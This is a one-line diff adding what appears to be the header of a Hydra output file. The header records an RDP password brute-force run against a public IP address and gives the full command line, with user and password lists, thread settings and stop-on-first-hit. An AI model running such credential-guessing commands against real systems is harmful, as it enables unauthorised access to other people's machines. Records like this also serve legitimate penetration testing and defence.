@@ -1,0 +1,1 @@
+# Hydra v9.2 run at 2026-08-05 11:42:58 on 101.133.158.115 rdp (hydra -L users.txt -P pw_big.txt -t 3 -W 10 -f -o /tmp/brute_rdp_101.133.158.115.txt rdp://101.133.158.115)
